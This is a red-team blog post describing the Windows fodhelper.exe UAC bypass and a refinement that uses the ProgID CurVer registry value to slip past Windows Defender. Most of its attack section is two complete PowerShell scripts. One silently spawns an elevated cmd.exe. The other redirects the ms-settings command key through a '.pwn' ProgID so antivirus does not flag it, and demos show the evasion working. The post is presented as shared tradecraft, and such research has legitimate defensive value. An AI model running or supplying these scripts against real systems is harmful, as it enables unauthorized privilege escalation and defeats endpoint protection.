---
layout: post
title: 'Utilizing Programmatic Identifiers (ProgIDs) for UAC Bypasses'
subtitle: 'Utilizing Programmatic Identifiers (ProgIDs) for UAC Bypasses'
date: 2021-10-20
author: V3ded
category: RedTeam
tags: blog
finished: true
excerpt_separator: <!--more-->
---

# Introduction
In today's blog, we will specifically talk about evading antivirus signatures that target registry keys which are associated with *UAC* (User Account Control) bypasses. First, I will briefly talk about *UAC* and what it really is. Subsequently, I will look at the `fodhelper.exe` *UAC* bypass and how it can be used to execute malicious code in an elevated context. Finally, I will show you a clever trick to evade defense solutions that might prevent the bypass from working.<!--more--> So with that, it's time to get our hands dirty!

***

# User Account Control (*UAC* ) Primer
*UAC* is a <a href="https://en.wikipedia.org/wiki/Mandatory_access_control" target="_blank">mandatory access control</a> enforcement feature of Windows that helps to prevent unauthorized actions or changes occurring to the operating system. This is achieved through an administrative consent prompt, which shows up whenever a user-launched application requires administrative elevation to carry out its tasks.

<figure>
<a href="/img/blog/utilizing-progids-for-uac-bypasses/01-UacPrompt.PNG" target="_blank"> <img class="centerImgSmall" src="/img/blog/utilizing-progids-for-uac-bypasses/01-UacPrompt.PNG"> </a>
<figcaption><i>UAC</i> prompting the user for permissions.</figcaption>
</figure>

According to Microsoft, this prompt ensures that no unknown or malicious software can silently install itself or inherit administrative privileges unless it is approved beforehand or the user explicitly authorizes it. Notice the word "silently" though. The prompt's only purpose is to **alert** the user when a launched program requires elevated privileges. It is then up to the user to decide whether that request should be honored or not. Although this solution is better than having nothing at all, it's still not ideal. As we all probably know, it is quite easy to trick an inexperienced user into clicking anything just to make an annoying popup disappear ¯\\_(ツ)\_/¯. 

To add insult to injury, what if I told you, that there is a way of launching programs in an elevated context without triggering the prompt at all? Yeah, it is in fact possible! Let me welcome you to the wonderful world of *UAC* bypasses.

> Note: for more in depth explanation of how *UAC* works check out <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works" target="_blank">MSDN</a>.

***

# *FodHelper.exe* *UAC* Bypass
`FodHelper` stands for "Features On Demand Helper". By default, the `fodhelper.exe` binary runs with a <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/integrity-levels" target="_blank">high integrity level</a>. When launched, it checks for the presence of the following registry keys:
```
HKCU:\Software\Classes\ms-settings\shell\open\command
HKCU:\Software\Classes\ms-settings\shell\open\command\DelegateExecute
HKCU:\Software\Classes\ms-settings\shell\open\command\(default)
```
If the aforementioned registry keys have commands assigned to them, `fodhelper.exe` will execute them in an elevated context (**without prompting the user**).

### Demo
To demonstrate *fodhelper*'s ability to bypass *UAC* and execute code in an elevated context, we will use the following <a href="https://gist.github.com/netbiosX/a114f8822eb20b115e33db55deee6692" target="_blank">script</a> from <a href="https://twitter.com/netbiosx" target="_blank">netbiosX</a>:
```powershell
function Bypass(){ 
    Param (    
        [String]$program = "cmd /c start C:\Windows\System32\cmd.exe" #default
        )

    #Create Registry Structure
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force

    #Start fodhelper.exe
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

    #Cleanup
    Start-Sleep 3
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
}
```

With this script, we can utilize the `Bypass` function to force `fodhelper.exe` to spawn an elevated instance of `cmd.exe` without any user interaction whatsoever.

<figure>
<a href="/img/blog/utilizing-progids-for-uac-bypasses/02-FodHelperDemo.gif" target="_blank"> <img class="centerImgHuge" src="/img/blog/utilizing-progids-for-uac-bypasses/02-FodHelperDemo.gif"> </a>
<figcaption><code class="language-plaintext highlighter-rouge">FodHelper.exe</code> setup to launch <code class="language-plaintext highlighter-rouge">cmd.exe</code> in an elevated context.</figcaption>
</figure>


Furthermore, we can easily verify the integrity of the newly created process with a tool such as <a href="https://github.com/processhacker/processhacker" target="_blank">Process Hacker</a>.

<figure>
<a href="/img/blog/utilizing-progids-for-uac-bypasses/03-DemoElevationProof.PNG" target="_blank"> <img class="centerImgMedium" src="/img/blog/utilizing-progids-for-uac-bypasses/03-DemoElevationProof.PNG"> </a>
<figcaption><code class="language-plaintext highlighter-rouge">cmd.exe</code> running in high integrity.</figcaption>
</figure>

***

# So What's the Catch?
Antivirus. That's what. 

If you were following along so far and actually tested the example I showed in the previous chapter, then you surely noticed that e.g. *Windows Defender* is not a fan of you writing to the `HKCU:\Software\Classes\ms-settings\Shell\Open\command` registry key. When you do, it immediately fires an alert to the user about potential malware and instantly stops the write process to the key.

<figure>
<a href="/img/blog/utilizing-progids-for-uac-bypasses/04-Caught.PNG" target="_blank"> <img class="centerImgMedium" src="/img/blog/utilizing-progids-for-uac-bypasses/04-Caught.PNG"> </a>
<figcaption><i>Windows Defender</i> alert about a possible <i>UAC</i> bypass.</figcaption>
</figure>

What's funny though, is that more often than not, even if *Defender* kills your script, your malicious executable will still be launched! That's usually due to the fact that only the process which wrote __to__ the registry gets terminated (see demo below).

<figure>
<a href="/img/blog/utilizing-progids-for-uac-bypasses/05-Caught.gif" target="_blank"> <img class="centerImgHuge" src="/img/blog/utilizing-progids-for-uac-bypasses/05-Caught.gif"> </a>
<figcaption><code class="language-plaintext highlighter-rouge">powershell.exe</code> is terminated. <br> However, <code class="language-plaintext highlighter-rouge">cmd.exe</code>  is still launched via <code class="language-plaintext highlighter-rouge">fodhelper.exe</code>despite the <i>Defender</i> warning.</figcaption>
</figure>

While this is great, we can do better. Much better. In fact, with a little bit of "magic", we can make this bypass work flawlessly without *Defender* killing the calling process and without alerting the user at all! And that all starts with something called *ProgIDs*.

***

# Programmatic Identifiers (*ProgIDs* ) in Windows
In Windows, a programmatic identifier (*ProgID* ) is a registry entry that can be associated with a Class ID (*CLSID* ), which is a globally unique serial number that identifies a *COM* (Component Object Model) class object. In simple terms the *ProgID* is basically a string such as "my-application.document" that represents a *CLSID* such as "{F9043C85-F6F2-101A-A3C9-08002B2F49FB}".

In addition, the Windows Shell uses the *ProgID* registry subkey to associate a file type with an application, and to control the behavior of the association. One of the values used in a *ProgID* subkey is an element with the name of `CurVer`. As far as I understand, the `CurVer` entry is used to set the default version of a COM application if multiple other versions are found on the system - i.e. you want the *ProgID* to reference version 1.2 of *my-application* over version 1.1. 

In an ideal world, this would be used to distinguish two identical applications with different versions as mentioned above. However, in our case, `CurVer` can be used to make a temporary version of the `Shell` subkey, which will in turn hopefully evade detections (as theoretically the original `Shell` subkey remains untouched). 

> Note: read <a href="https://docs.microsoft.com/en-us/windows/win32/shell/fa-progids" target="_blank">MSDN</a> for more information regarding programmatic identifiers. 

### The Magic
Now that we know what `CurVer` is and what it does, we can use it to our advantage. More specifically, we can abuse `CurVer` by setting the `Shell` subkey to the *ProgID* with the version name of e.g. `.pwn`. In order to achieve this, all we really need to do is slightly modify our previous PowerShell script.

```powershell
function Bypass { 
    Param (    
        [String]$program = "cmd /c start C:\Windows\System32\cmd.exe"
    )
    
    # Warning: a ProgID entry needs to be located in the HKCR (HKEY_CLASSES_ROOT) hive in order to take effect.
    #                                                    HKCR = HKLM:\Software\Classes
    #                                                         = HKCU:\Software\Classes
    New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
    Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
    
    New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
    Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force
    
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    
    Start-Sleep 3
    
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
    Remove-Item "HKCU:\Software\Classes\.pwn\" -Recurse -Force
}
```
If you have trouble seeing what's happening, imagine the procedure in multiple steps:
- Create a `HKCU:\Software\Classes\.pwn\Shell\Open\command` subkey with a custom *ProgID* of `.pwn`
- Create a `CurVer` subkey in `HKCU:\Software\Classes\ms-settings`
- Set the `CurVer` subkey's `(default)` value to the value of the chosen *ProgID* (`.pwn`) 

If configured correctly, the system should translate this registry setup into `HKCU:\Software\Classes\ms-settings\Shell\Open\command` by prepending `CurVer`'s registry path to `Shell\Open\command`. Note, that the final (concatenated) path is exactly the same as the path used in the original PowerShell script from <a href="https://twitter.com/netbiosx" target="_blank">netbiosX</a>.

With this change, *Defender* should now be tricked into believing that the original `command` subkey is untouched. As a result, we should be able to run the bypass without triggering an AV alert. 

<figure>
<a href="/img/blog/utilizing-progids-for-uac-bypasses/06-Evaded.gif" target="_blank"> <img class="centerImgHuge" src="/img/blog/utilizing-progids-for-uac-bypasses/06-Evaded.gif"> </a>
<figcaption><code class="language-plaintext highlighter-rouge">cmd.exe</code> is launched in an elevated context while <code class="language-plaintext highlighter-rouge">powershell.exe</code> is still running in the background (AV has been bypassed).</figcaption>
</figure>

Mission accomplished.

> Note: the last demo was carried out against *Defender* definitions from *10/19/21*.

> Note: if you want to see an example of a similar attack being used in the wild, look at page 38 of the *InvisiMole* <a href="https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_InvisiMole.pdf" target="_blank">report</a> from ESET's research team.

***

# Kudos
I would like to express my gratitude to <a href="https://twitter.com/filip_dragovic" target="_blank"> Filip Dragovic</a> for sharing the *InvisiMole* report with me. If it wasn't for him, I wouldn't even know that registry manipulation with programmatic identifiers is possible. In addition, I would like to thank <a href="https://twitter.com/jack_halon" target="_blank">Jack</a> for proof-reading my blog before its release and adding in a few important details. You guys are both amazing, thank you for helping me.

***

# Appendix

If you prefer video demos instead of gifs, look at the links below.
- <a href="/img/blog/utilizing-progids-for-uac-bypasses/02,5-FodHelperBypassDemo.mp4" target="_blank">Demo 01</a> - *UAC* bypass
- <a href="/img/blog/utilizing-progids-for-uac-bypasses/05,5-Caught.mp4" target="_blank">Demo 02</a> - *UAC* bypass caught
- <a href="/img/blog/utilizing-progids-for-uac-bypasses/06-Evaded.mp4" target="_blank">Demo 03</a> - *UAC* bypass undetected

***

# Conclusion
That's about it folks. I hope you enjoyed this post! As was the case with my <a href="/redteam/abusing-lnk-features-for-initial-access-and-persistence" target="_blank"> previous blog</a>, I just felt like this technique deserved a little bit more recognition. Main reason being, that I really struggled to find information regarding this attack vector on the internet. Therefore, if you read the blog until its end, I really hope you at least learnt something new. Thank you, and until next time!